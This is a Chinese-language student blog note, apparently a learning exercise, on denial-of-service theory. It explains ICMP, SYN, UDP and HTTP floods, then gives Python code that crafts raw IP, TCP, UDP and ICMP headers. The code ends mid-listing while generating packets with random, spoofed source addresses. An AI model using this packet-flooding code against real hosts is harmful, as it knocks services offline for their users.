@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Yijun Lin">
+
+
+    <meta name="subtitle" content="Yijun Lin">
+
+
+
+
+<title>StudyNote | DoS相关理论与实践 | Yijun&#39;s Studio | Welcome!</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Yijun&#39;s Studio</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Yijun&#39;s Studio</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">StudyNote | DoS相关理论与实践</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Yijun Lin</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 25, 2020&nbsp;&nbsp;19:00:44</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/SHU/">SHU</a>
+                            
+                                <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%8E%E6%8A%80%E6%9C%AFComputerScience/">计算机科学与技术ComputerScience</a>
+                            
+                                <a href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9CComputerNetwork/">计算机网络ComputerNetwork</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p><strong>Created Date</strong>: 2020-10-25 19:00:44<br><strong>Last Upgraded Date</strong>: 2020-10-28 12:14:53</p>
+<br/>
+
+
+
+<h1 id="操作环境"><a href="#操作环境" class="headerlink" title="操作环境"></a>操作环境</h1><blockquote>
+<p>自用腾讯云服务器</p>
+<p>CentOS Linux release 8.0.1905 (Core) </p>
+<p>macOS Catalina Version 10.15.5</p>
+<p>Python 3.7</p>
+<p>Pycharm Professional  2020.1.3</p>
+</blockquote>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="DoS相关知识"><a href="#DoS相关知识" class="headerlink" title="DoS相关知识"></a>DoS相关知识</h2><h3 id="DoS简介"><a href="#DoS简介" class="headerlink" title="DoS简介"></a>DoS简介</h3><p>In computing, a denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet. Denial of service is typically accomplished by flooding the targeted machine or resource with superfluous requests in an attempt to overload systems and prevent some or all legitimate requests from being fulfilled.</p>
+<h3 id="DoS种类"><a href="#DoS种类" class="headerlink" title="DoS种类"></a>DoS种类</h3><ul>
+<li>Distributed DoS</li>
+<li>Application layer attacks</li>
+<li>Advanced persistent DoS</li>
+<li>Denial-of-service as a service</li>
+</ul>
+<h3 id="DoS攻击方式"><a href="#DoS攻击方式" class="headerlink" title="DoS攻击方式"></a><a href="https://en.wikipedia.org/wiki/Category:Denial-of-service_attacks" target="_blank" rel="noopener">DoS攻击方式</a></h3><h4 id="Internet-Control-Message-Protocol-ICMP-flood"><a href="#Internet-Control-Message-Protocol-ICMP-flood" class="headerlink" title="Internet Control Message Protocol (ICMP) flood"></a><a href="https://en.wikipedia.org/wiki/HTTP_Flood" target="_blank" rel="noopener">Internet Control Message Protocol (ICMP) flood</a></h4><p>A smurf attack relies on misconfigured network devices that allow packets to be sent to all computer hosts on a particular network via the broadcast address of the network, rather than a specific machine. The attacker will send large numbers of IP packets with the source address faked to appear to be the address of the victim. Most devices on a network will, by default, respond to this by sending a reply to the source IP address. If the number of machines on the network that receive and respond to these packets is very large, the victim’s computer will be flooded with traffic. This overloads the victim computer and can even make it unusable during such attack.</p>
+<p>Ping flood is based on sending the victim an overwhelming number of ping packets, usually using the “ping” command from Unix-like hosts (the -t flag on Windows systems is much less capable of overwhelming a target, also the -l (size) flag does not allow sent packet size greater than 65500 in Windows). It is very simple to launch, the primary requirement being access to greater bandwidth than the victim.</p>
+<p>Ping of death is based on sending the victim a malformed ping packet, which will lead to a system crash on a vulnerable system.</p>
+<h4 id="S-SYN-flood"><a href="#S-SYN-flood" class="headerlink" title="(S)SYN flood"></a><a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank" rel="noopener">(S)SYN flood</a></h4><p>A SYN flood is a form of denial-of-service attack in which an attacker rapidly initiates a connection to a server without finalizing the connection. The server has to spend resources waiting for half-opened connections, which can consume enough resources to make the system unresponsive to legitimate traffic.</p>
+<p>The packet that the attacker sends is the SYN packet, a part of TCP’s three-way handshake used to establish a connection.</p>
+<p>When a client attempts to start a TCP connection to a server, the client and server exchange a series of messages which normally runs like this:</p>
+<p>The client requests a connection by sending a SYN (synchronize) message to the server.<br>The server acknowledges this request by sending SYN-ACK back to the client.<br>The client responds with an ACK, and the connection is established.<br>This is called the TCP three-way handshake, and is the foundation for every connection established using the TCP protocol.</p>
+<p>A SYN flood attack works by not responding to the server with the expected ACK code. The malicious client can either simply not send the expected ACK, or by spoofing the source IP address in the SYN, cause the server to send the SYN-ACK to a falsified IP address – which will not send an ACK because it “knows” that it never sent a SYN.</p>
+<h4 id="UDP-flood-attack"><a href="#UDP-flood-attack" class="headerlink" title="UDP flood attack"></a><a href="https://en.wikipedia.org/wiki/UDP_flood_attack" target="_blank" rel="noopener">UDP flood attack</a></h4><p>A UDP flood attack is a volumetric denial-of-service (DoS) attack using the User Datagram Protocol (UDP), a sessionless/connectionless computer networking protocol.</p>
+<p>Using UDP for denial-of-service attacks is not as straightforward as with the Transmission Control Protocol (TCP). However, a UDP flood attack can be initiated by sending a large number of UDP packets to random ports on a remote host. As a result, the distant host will:</p>
+<ul>
+<li>Check for the application listening at that port;</li>
+<li>See that no application listens at that port;</li>
+<li>Reply with an ICMP Destination Unreachable packet.</li>
+</ul>
+<p>Thus, for a large number of UDP packets, the victimized system will be forced into sending many ICMP packets, eventually leading it to be unreachable by other clients. The attacker(s) may also spoof the IP address of the UDP packets, ensuring that the excessive ICMP return packets do not reach them, and anonymizing their network location(s). Most operating systems mitigate this part of the attack by limiting the rate at which ICMP responses are sent.</p>
+<h4 id="HTTP-flood"><a href="#HTTP-flood" class="headerlink" title="HTTP flood"></a><a href="https://en.wikipedia.org/wiki/HTTP_Flood" target="_blank" rel="noopener">HTTP flood</a></h4><p><a href="https://blog.sucuri.net/2014/02/layer-7-ddos-blocking-http-flood-attacks.html" target="_blank" rel="noopener">Blocking HTTP Flood Attacks</a></p>
+<p>In an HTTP flood, the HTTP clients such as web browser interact with an application or server to send HTTP requests. The request can be either “GET” or “POST”. The aim of the attack is when to compel the server to allocate as many resources as possible to serving the attack, thus denying legitimate users access to the server’s resources.</p>
+<h5 id="GET-flood"><a href="#GET-flood" class="headerlink" title="GET flood"></a>GET flood</h5><p>The GET request is used to retrieve static content like images. Typically this induces relatively low load on the server per request.</p>
+<h5 id="POST-flood"><a href="#POST-flood" class="headerlink" title="POST flood"></a>POST flood</h5><p>POST requests are more likely to require the server to perform some kind of processing, such as looking up items in a database. Therefore, HTTP POST flood attacks typically impose higher load on the server per request.</p>
+<h1 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h1><h2 id="报文"><a href="#报文" class="headerlink" title="报文"></a>报文</h2><h4 id="伪首部（TCP-UDP"><a href="#伪首部（TCP-UDP" class="headerlink" title="伪首部（TCP/UDP)"></a>伪首部（TCP/UDP)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_header_pseudo</span><span class="params">(self, srcaddr, dstaddr, ptcl, tslen)</span>:</span></span><br><span class="line">    pseudo_SourceAddr = socket.inet_aton(srcaddr)   <span class="comment"># 32 bits 4 bytes</span></span><br><span class="line">    pseudo_DestinAddr = socket.inet_aton(dstaddr)   <span class="comment"># 32 bits 4 bytes</span></span><br><span class="line">    print(socket.inet_ntoa(pseudo_SourceAddr), socket.inet_ntoa(pseudo_DestinAddr))</span><br><span class="line">    pseudo_MustBeZero = <span class="number">0</span>   <span class="comment"># 8 bits 1 bytes</span></span><br><span class="line">    pseudo_Protocol = ptcl  <span class="comment"># 8 bits 1 bytes</span></span><br><span class="line">    pseudo_TransportLen = tslen</span><br><span class="line">    <span class="comment"># generate pseudo header</span></span><br><span class="line">    pseudo_header = struct.pack(<span class="string">"!4s4sBBH"</span>, pseudo_SourceAddr, pseudo_DestinAddr,</span><br><span class="line"> pseudo_MustBeZero, pseudo_Protocol, pseudo_TransportLen)</span><br><span class="line">    <span class="keyword">return</span> pseudo_header</span><br></pre></td></tr></table></figure>
+
+<p>SourceAddr    32</p>
+<p>DestinAddr    32</p>
+<p>MustBeZero    8</p>
+<p>Protocol    8</p>
+<p>TransportLen    </p>
+<h4 id="TCP头"><a href="#TCP头" class="headerlink" title="TCP头"></a>TCP头</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_header_tcp</span><span class="params">(self, srcaddr, dstaddr, srcport, dstport)</span>:</span></span><br><span class="line">    tcp_SourcePort = srcport    <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    tcp_DestinPort = dstport    <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    tcp_SeqNumber = random.randint(<span class="number">0x10000000</span>,<span class="number">0xffffffff</span>)   <span class="comment"># 32 bits 4 bytes</span></span><br><span class="line">    tcp_AckNumber = <span class="number">0</span>   <span class="comment"># 32 bits 4 bytes</span></span><br><span class="line">    tcp_HeaderLen = (<span class="number">5</span> &lt;&lt; <span class="number">4</span> | <span class="number">0</span>)    <span class="comment"># 4 bits .5 bytes</span></span><br><span class="line">    tcp_Reserved = <span class="number">0</span>        <span class="comment"># 3 bits</span></span><br><span class="line">    <span class="comment"># For convenience, split reserved parts into HeaderLen and Flag.</span></span><br><span class="line">    <span class="comment"># so that HeaderLen is 8 bits long and Flag is 8 bits long too.</span></span><br><span class="line">    <span class="comment"># 6 Flags URG/ACK/PSH/RST/SYN/FIN</span></span><br><span class="line">    tcp_Flag = <span class="number">2</span>    <span class="comment"># SYN; 9 bits</span></span><br><span class="line">    tcp_Winsize = <span class="number">0x2000</span>    <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    tcp_Checksum = <span class="number">0</span>        <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    tcp_UrgentPointer = <span class="number">0</span>   <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    <span class="comment"># ! == Bigend Mode; B/H/L == 1/2/4 Bytes</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">"!HHLLBBHHH"</span>, tcp_SourcePort, tcp_DestinPort, tcp_SeqNumber, tcp_AckNumber, tcp_HeaderLen, tcp_Flag, tcp_Winsize, tcp_Checksum, tcp_UrgentPointer)</span><br><span class="line">    <span class="comment"># generate pseudo header</span></span><br><span class="line">    protocol = socket.IPPROTO_TCP</span><br><span class="line">    <span class="comment"># header and data length(tcp has no data length)</span></span><br><span class="line">    hndlen = len(tcp_header)</span><br><span class="line">    <span class="comment"># pseudo header</span></span><br><span class="line">    psd_header = self.generate_header_pseudo(srcaddr, dstaddr, protocol, hndlen)</span><br><span class="line">    <span class="comment"># assemble the header for calculating checksum</span></span><br><span class="line">    virtual_tcp_header = psd_header + tcp_header</span><br><span class="line">    <span class="comment"># call function calc_checksum() to calculate</span></span><br><span class="line">    tcp_Checksum = self.calc_checksum(virtual_tcp_header)</span><br><span class="line">    <span class="comment"># re-assemble the header with correct checksum</span></span><br><span class="line">    tcp_header = struct.pack(<span class="string">"!HHLLBBHHH"</span>, tcp_SourcePort, tcp_DestinPort, tcp_SeqNumber, tcp_AckNumber, tcp_HeaderLen, tcp_Flag, tcp_Winsize, tcp_Checksum, tcp_UrgentPointer)</span><br><span class="line">    <span class="keyword">return</span> tcp_header</span><br></pre></td></tr></table></figure>
+
+<p>SourcePort    16</p>
+<p>DestinPort    16</p>
+<p>SeqNumber    32</p>
+<p>AckNumber    32</p>
+<p>HeaderLen    4</p>
+<p>Reserved    3</p>
+<p>Flag    1*9</p>
+<p>Winsize    16</p>
+<p>Checksum    16</p>
+<p>UrgentPointer    16</p>
+<p><img src="./pics/CNTCP.png" alt="TCPHeader"></p>
+<h4 id="UDP头"><a href="#UDP头" class="headerlink" title="UDP头"></a>UDP头</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_header_udp</span><span class="params">(self, srcaddr, dstaddr, srcport, dstport, data)</span>:</span></span><br><span class="line">    udp_SourcePort = srcport    <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    udp_DestinPort = dstport    <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    udp_Data = data</span><br><span class="line">    udp_Len = <span class="number">8</span> + len(udp_Data) <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    udp_Checksum = <span class="number">0</span>            <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    <span class="comment"># udp header without checksum</span></span><br><span class="line">    udp_header_without_checksum = struct.pack(<span class="string">"!HHHH"</span>, udp_SourcePort, udp_DestinPort, udp_Len, udp_Checksum)</span><br><span class="line">    <span class="comment"># generate pseudo</span></span><br><span class="line">    protocol = socket.IPPROTO_UDP</span><br><span class="line">    <span class="comment"># pseudo header</span></span><br><span class="line">    psd_header = self.generate_header_pseudo(srcaddr, dstaddr, protocol, udp_Len)</span><br><span class="line">    <span class="comment"># assemble the header for calculating checksum</span></span><br><span class="line">    virtual_udp_header = psd_header + udp_header_without_checksum + udp_Data.encode()</span><br><span class="line">    udp_Checksum = self.calc_checksum(virtual_udp_header)</span><br><span class="line">    <span class="comment"># re-assemble the header with correct checksum</span></span><br><span class="line">    udp_header = struct.pack(<span class="string">"!HHHH"</span>, udp_SourcePort, udp_DestinPort, udp_Len, udp_Checksum)</span><br><span class="line">    <span class="comment"># Testing random srcip</span></span><br><span class="line">    print(udp_SourcePort, udp_DestinPort, udp_Len, udp_Checksum)</span><br><span class="line">    <span class="keyword">return</span> udp_header</span><br></pre></td></tr></table></figure>
+
+<p>SourcePort    16</p>
+<p>DestinPort    16</p>
+<p>Len    16</p>
+<p>Checksum    16</p>
+<p>Data</p>
+<p><img src="./pics/CNUDP.png" alt="UDPHeader"></p>
+<h4 id="ICMP头"><a href="#ICMP头" class="headerlink" title="ICMP头"></a>ICMP头</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_header_icmp</span><span class="params">(self)</span>:</span></span><br><span class="line">    icmp_Type = <span class="number">8</span>   <span class="comment"># 8 bits 1 bytes</span></span><br><span class="line">    icmp_Code = <span class="number">0</span>   <span class="comment"># 8 bits 1 bytes</span></span><br><span class="line">    icmp_Checksum = <span class="number">0</span>   <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    icmp_Idenfication = random.randint(<span class="number">1000</span>,<span class="number">10000</span>)  <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    icmp_SeqNumber = random.randint(<span class="number">1000</span>,<span class="number">10000</span>)     <span class="comment"># 16 bits 2 bytes</span></span><br><span class="line">    icmp_Data = <span class="string">'YijunStudioYijunStudioYijunStudioYijunStudioYijunStudioYijunStudio'</span></span><br><span class="line">    icmp_DataLen = len(icmp_Data)</span><br><span class="line">    <span class="comment"># icmp header without checksum</span></span><br><span class="line">    icmp_header_without_checksum = struct.pack(<span class="string">f"!BBHHH<span class="subst">&#123;icmp_DataLen&#125;</span>s"</span>, icmp_Type, icmp_Code, icmp_Checksum, icmp_Idenfication, icmp_SeqNumber, icmp_Data.encode())</span><br><span class="line">    <span class="comment"># calculating checksum(no pseudo header required)</span></span><br><span class="line">    icmp_Checksum = self.calc_checksum(icmp_header_without_checksum)</span><br><span class="line">    <span class="comment"># re-assemble the header with correct checksum</span></span><br><span class="line">    icmp_header = struct.pack(<span class="string">f"!BBHHH<span class="subst">&#123;icmp_DataLen&#125;</span>s"</span>, icmp_Type, icmp_Code, icmp_Checksum, icmp_Idenfication, icmp_SeqNumber, icmp_Data.encode())</span><br><span class="line">    <span class="keyword">return</span> icmp_header</span><br></pre></td></tr></table></figure>
+
+<p>Type    8</p>
+<p>Code    8</p>
+<p>Checksum    16</p>
+<p>Idenfication    16</p>
+<p>SeqNumber    16</p>
+<p>Data</p>
+<p><img src="./pics/CNICMP.png" alt="IMCPHeader"></p>
+<h4 id="IP头"><a href="#IP头" class="headerlink" title="IP头"></a>IP头</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_header_ip</span><span class="params">(self, srcaddr, dstaddr, segmentsize, tsprtl)</span>:</span></span><br><span class="line">    ip_Version_IHL = <span class="number">0x45</span> <span class="comment"># 4 bits + 4 bits</span></span><br><span class="line">    ip_TOS = <span class="number">0</span> <span class="comment"># 8 bits</span></span><br><span class="line">    ip_Length = <span class="number">20</span> + segmentsize    <span class="comment"># 16 bits</span></span><br><span class="line">    ip_Identification = <span class="number">1</span>  <span class="comment"># 16 bits</span></span><br><span class="line">    ip_Flag_Offset = <span class="number">0x4000</span>    <span class="comment"># 3 bits + 13 bits</span></span><br><span class="line">    ip_TTL = <span class="number">128</span>     <span class="comment"># 8 bits</span></span><br><span class="line">    ip_Protocol = tsprtl   <span class="comment"># 8 bits</span></span><br><span class="line">    ip_HeaderChecksum = <span class="number">0</span>  <span class="comment"># 16 bits</span></span><br><span class="line">    ip_SourceAddr = socket.inet_aton(srcaddr)  <span class="comment"># 32 bits</span></span><br><span class="line">    ip_DestinAddr = socket.inet_aton(dstaddr)  <span class="comment"># 32 bits</span></span><br><span class="line">    <span class="comment"># assemble the header for calculating checksum</span></span><br><span class="line">    ip_header = struct.pack(<span class="string">"!BBHHHBBh4s4s"</span>, ip_Version_IHL, ip_TOS, ip_Length, ip_Identification, ip_Flag_Offset, ip_TTL, ip_Protocol, ip_HeaderChecksum, ip_SourceAddr, ip_DestinAddr)</span><br><span class="line">    print(<span class="string">f"packet is <span class="subst">&#123;binascii.b2a_hex(ip_header)&#125;</span>"</span>)</span><br><span class="line">    <span class="comment"># calculating checksum</span></span><br><span class="line">    ip_HeaderChecksum = self.calc_checksum(ip_header)</span><br><span class="line">    <span class="comment"># re-assemble the header with correct checksum</span></span><br><span class="line">    ip_header = struct.pack(<span class="string">"!BBHHHBBH4s4s"</span>, ip_Version_IHL, ip_TOS, ip_Length, ip_Identification, ip_Flag_Offset, ip_TTL, ip_Protocol, ip_HeaderChecksum, ip_SourceAddr, ip_DestinAddr)</span><br><span class="line">    print(<span class="string">f"IPv4 Header is <span class="subst">&#123;binascii.b2a_hex(ip_header)&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> ip_header</span><br></pre></td></tr></table></figure>
+
+<p>Version    4</p>
+<p>HeaderLen-IHL    4</p>
+<p>TOS    8</p>
+<p>Length    16</p>
+<p>Identification    16</p>
+<p>Flag    3</p>
+<p>Offset    13</p>
+<p>TTL    8</p>
+<p>Protocol    8</p>
+<p>HeaderChecksum    16</p>
+<p>SourceAddr    32</p>
+<p>DestinAddr    32</p>
+<p><img src="./pics/CNIPv4.png" alt="IPHeader"></p>
+<h2 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_checksum</span><span class="params">(self, header)</span>:</span></span><br><span class="line">    <span class="comment"># init checksum with 0</span></span><br><span class="line">    checksum = <span class="number">0</span></span><br><span class="line">    <span class="comment"># traverse the header with step 2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(header), <span class="number">2</span>):</span><br><span class="line">        <span class="comment"># get the first byte</span></span><br><span class="line">        tmp = header[i]</span><br><span class="line">        <span class="comment"># left push first byte for 8, give lower 8 for the second byte</span></span><br><span class="line">        <span class="comment"># adding them together so that can get a work</span></span><br><span class="line">        tmp = (tmp &lt;&lt; <span class="number">8</span>) + header[i + <span class="number">1</span>]</span><br><span class="line">        <span class="comment"># adding up the words</span></span><br><span class="line">        checksum += tmp</span><br><span class="line">    <span class="comment"># dealing with overflow</span></span><br><span class="line">    checksum = (checksum &amp; <span class="number">0xffff</span>) + (checksum &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># re-dealing with overflow</span></span><br><span class="line">    checksum += (checksum &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    <span class="comment"># reverse code</span></span><br><span class="line">    checksum = ~checksum &amp; <span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">return</span> checksum</span><br></pre></td></tr></table></figure>
+
+<h2 id="封包"><a href="#封包" class="headerlink" title="封包"></a>封包</h2><h4 id="生成IP包"><a href="#生成IP包" class="headerlink" title="生成IP包"></a>生成IP包</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_ip_packet</span><span class="params">(self, trsprtl)</span>:</span></span><br><span class="line">    <span class="comment"># random generate source address</span></span><br><span class="line">    srcaddr = <span class="string">f"<span class="subst">&#123;random.randint(<span class="number">0</span>,<span class="number">240</span>)&#125;</span>.<span class="subst">&#123;random.randint(<span class="number">0</span>,<span class="number">240</span>)&#125;</span>.<span class="subst">&#123;random.randint(<span class="number">0</span>,<span class="number">240</span>)&#125;</span>.<span class="subst">&#123;random.randint(<span class="number">0</span>,<span class="number">240</span>)&#125;</span>"</span></span><br><span class="line">    <span class="comment"># random generate source port</span></span><br><span class="line">    srcport = random.randint(<span class="number">10000</span>, <span class="number">60000</span>)</span><br><span class="line">    